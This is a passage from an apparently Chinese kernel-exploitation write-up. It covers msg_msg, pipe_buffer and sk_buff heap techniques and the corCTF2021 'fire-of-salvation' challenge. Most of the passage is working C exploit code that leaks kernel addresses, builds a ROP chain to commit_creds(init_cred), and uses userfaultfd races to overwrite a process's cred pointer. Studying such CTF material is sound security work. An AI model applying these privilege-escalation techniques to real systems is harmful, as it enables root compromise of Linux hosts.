class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to spary sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[victim_qid], &amp;msgbuf, <span class="keyword">sizeof</span>(msgbuf.mtext), <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to release secondary msg.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to create pipe.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;sky123&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to write pipe.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_offset = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf</span> =</span> (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to release sk_buff.&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_kernel_text_addr((<span class="type">size_t</span>) pipe_buf-&gt;ops)) &#123;</span><br><span class="line">                qword_dump(<span class="string">&quot;leak pipe_buf_operations addr&quot;</span>, fake_msg, <span class="keyword">sizeof</span>(fake_msg));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] leak pipe_buf_operations addr: %p\n&quot;</span>, pipe_buf-&gt;ops);</span><br><span class="line">                kernel_offset = (<span class="type">size_t</span>) pipe_buf-&gt;ops - <span class="number">0xffffffff8203fe40</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak kernel addr.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    push_rsi_pop_rsp_pop_rbx_pop_r12_pop_r13_pop_rbp_ret += kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf-&gt;page = (<span class="type">void</span> *) <span class="number">0xdeadbeef</span>;</span><br><span class="line">    pipe_buf-&gt;ops = (<span class="type">void</span> *) (victim_addr + <span class="number">0x100</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> pipe_buf_operations *) &amp;fake_msg[<span class="number">0x100</span>])-&gt;release = (<span class="type">void</span> *) push_rsi_pop_rsp_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;fake_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop[rop_idx++] = pop_rdi_ret;</span><br><span class="line">    rop[rop_idx++] = init_cred;</span><br><span class="line">    rop[rop_idx++] = commit_creds;</span><br><span class="line">    rop[rop_idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[rop_idx++] = user_cs;</span><br><span class="line">    rop[rop_idx++] = user_rflags;</span><br><span class="line">    rop[rop_idx++] = user_sp;</span><br><span class="line">    rop[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_msg, <span class="keyword">sizeof</span>(fake_msg)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to spary sk_buff.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3
id="任意地址写结合-userfaultfd-或-fuse-完成-race-condition-write">任意地址写（结合
userfaultfd 或 FUSE 完成 race condition write）</h3>
<p>当我们调用 <code>msgsnd</code> 系统调用时，其会调用
<code>load_msg()</code> 将用户空间数据拷贝到内核空间中，首先是调用
<code>alloc_msg()</code> 分配 <code>msg_msg</code>
单向链表，之后才是正式的拷贝过程，即空间的分配与数据的拷贝是分开进行的。</p>
<p>我们不难想到的是，在拷贝时利用 userfaultfd/FUSE
将拷贝停下来，在子进程中篡改 <code>msg_msg</code> 的 <code>next</code>
指针，在恢复拷贝之后便会向我们篡改后的目标地址上写入数据，从而实现任意地址写。
#### 例题：corCTF2021 fire-of-salvation</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/corCTF2021-fire-of-salvation" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>一个防火墙驱动，可以添加编辑和删除规则，对应 <code>kmalloc-4k</code>
的 object 的添加编辑和删除。另外还有 <code>firewall_dup</code>
操作将流量入口或出口规则复制一份到出口或入口，即 object
指针复制一份到另一个列表，因此存在任意次 UAF。</p>
<p>首先创建 <code>msg_msg</code> 并且通过 UAF 修改 <code>m_ts</code>
越界读堆喷的 <code>shm_file_data</code> 泄露内核基址。这里由于
<code>firewall_edit</code> 功能在 <code>IP</code> 或
<code>Netmask</code> 错误的时候只修改前 0x20 字节，因此不会覆盖到
<code>next</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3b23fe567f8eefe49e53c5d0951a10f4.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>由于本题目开启了 FG_KASLR 保护，无法通过泄露内核基址确定
<code>commit_creds</code> 以及相关 gadget 的地址，因此需要采用修改
<code>task_struct</code> 的 <code>cred</code> 指针为
<code>init_cred</code> 地址的方式提权。搜索本进程
<code>task_struct</code> 的方法有两种，一是通过
<code>prctl(PR_SET_NAME, "sky123");</code> 修改 <code>task_struct</code>
的 <code>comm</code> 字段然后利用类似 D^3CTF2022 - d3kheap 的方法搜索
<code>comm</code> 字段来定位 <code>task_struct</code> 。另一种方法是从
<code>init_task</code> 开始通过 <code>tasks</code> 双向链表遍历进程判断
<code>pid</code> 的方式定位。这里采用第二种方法。 需要注意的是为了确保
<code>msg_msgseg</code> 的 <code>next</code> 指针为 NULL
，在内存搜索时需要将 <code>msg_msgseg</code> 构造到
<code>&amp;task_struct.tasks - 8</code> 的位置，当按照
<code>task_struct.tasks.prev</code> 遍历 <code>tasks</code>
链表的时候该位置很大概率为 NULL（新创建的进程都是从
<code>init_task.tasks.prev</code>
添加的，因此基本上第一个就是自身进程）。</p>
<p>之后创建一个新的 <code>msg_queue</code> 然后 <code>msgsnd</code>
添加一个 <code>msg_msg</code> 在 <code>copy_from_user</code> 阶段用
userfaultfd 卡住，然后 UAF 修改 <code>next</code> 为
<code>&amp;task_struct.cred - 0x10</code>（确保 <code>next</code> 为
NULL）从而写入 <code>init_cred</code> 地址实现提权。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/609b2cc29e61360430d4be7aaa50b85f.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line">    <span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_KERNEL_OFFSET 0x1145141919810</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> kernel_addr_list[] = &#123;</span><br><span class="line">        <span class="number">0xffffffff81c3d7a0</span>,</span><br><span class="line">        <span class="number">0xffffffff81a0d0e0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernel_offset_query</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_kernel_text_addr(kernel_text_leak)) &#123;</span><br><span class="line">        <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kernel_addr_list) / <span class="keyword">sizeof</span>(kernel_addr_list[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!((kernel_text_leak ^ kernel_addr_list[i]) &amp; <span class="number">0xFFF</span>) &amp;&amp; (kernel_text_leak - kernel_addr_list[i]) % <span class="number">0x100000</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> kernel_text_leak - kernel_addr_list[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] unknown kernel addr: %#lx\n&quot;</span>, kernel_text_leak);</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">search_kernel_offset</span><span class="params">(<span class="type">void</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> *search_buf = buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> kernel_offset = kernel_offset_query(search_buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel leak addr: %#lx\n&quot;</span>, search_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %#lx\n&quot;</span>, kernel_offset);</span><br><span class="line">            <span class="keyword">return</span> kernel_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_MSG ((size_t) PAGE_SIZE - sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_SEG ((size_t) PAGE_SIZE - sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf *) msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="type">void</span> *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.next = (<span class="type">void</span> *) m_list_next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.prev = (<span class="type">void</span> *) m_list_prev;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_type = (<span class="type">long</span>) m_type;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_ts = m_ts;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;next = (<span class="type">void</span> *) next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;security = (<span class="type">void</span> *) security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[DATALEN_MSG + DATALEN_SEG];</span><br><span class="line">&#125; oob_msgbuf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">void</span> *(*handler)(<span class="type">void</span> *) )</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span> =</span> &#123;.api = UFFD_API, .features = <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint8_t</span> idx;</span><br><span class="line">    <span class="type">uint8_t</span> type;</span><br><span class="line">    <span class="type">uint16_t</span> proto;</span><br><span class="line">    <span class="type">uint16_t</span> port;</span><br><span class="line">    <span class="type">uint8_t</span> action;</span><br><span class="line">    <span class="type">char</span> desc[<span class="number">0x800</span>];</span><br><span class="line">&#125; <span class="type">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> firewall_fd;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    INBOUND,</span><br><span class="line">    OUTBOUND</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">uint8_t</span> type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0x1337BABE</span>, &amp;(<span class="type">user_rule_t</span>)&#123;.type = type, .idx = idx, .ip = <span class="string">&quot;0.0.0.0&quot;</span>, .netmask = <span class="string">&quot;0.0.0.0&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">uint8_t</span> type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0xBAAD5AAD</span>, &amp;(<span class="type">user_rule_t</span>)&#123;.type = type, .idx = idx&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">uint8_t</span> type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(firewall_fd, <span class="number">0xDEADBABE</span>, &amp;(<span class="type">user_rule_t</span>)&#123;.type = type, .idx = idx&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inet_ntoa</span><span class="params">(<span class="type">char</span> *buf, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d.%d.%d.%d&quot;</span>, val &amp; <span class="number">0x000000FF</span>, (val &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>, (val &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>, (val &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit_rule</span><span class="params">(<span class="type">uint8_t</span> idx, <span class="type">void</span> *buf, <span class="type">uint8_t</span> type, <span class="type">bool</span> invalid)</span> &#123;</span><br><span class="line">    <span class="type">user_rule_t</span> rule = &#123;.type = type, .idx = idx&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;rule, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (invalid) &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(rule.ip, <span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(rule.netmask, <span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        inet_ntoa(rule.ip, *(<span class="type">uint32_t</span> *) &amp;buf[<span class="number">0x20</span>]);</span><br><span class="line">        inet_ntoa(rule.netmask, *(<span class="type">uint32_t</span> *) &amp;buf[<span class="number">0x24</span>]);</span><br><span class="line">  